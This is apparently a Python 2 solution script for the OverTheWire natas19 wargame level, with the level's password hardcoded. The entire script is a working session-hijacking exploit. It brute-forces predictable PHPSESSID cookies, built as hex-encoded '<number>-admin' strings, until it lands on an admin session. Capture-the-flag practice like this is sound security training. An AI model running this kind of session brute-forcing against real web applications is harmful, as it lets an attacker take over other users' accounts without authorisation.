import requests

host="http://natas19.natas.labs.overthewire.org"

username="natas19"
password="4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

cookies=dict()
def gencookie(i):
    cookie=str(i)+"-admin"
    return cookie.encode("hex")
# backwards. hopefully will be faster
for i in range(640,-1,-1):
    print i
    cookies['PHPSESSID']= gencookie(i)
    r = requests.get(host,cookies=cookies,auth=(username,password))
    if not "regular" in r.text:
        print r.text
        break
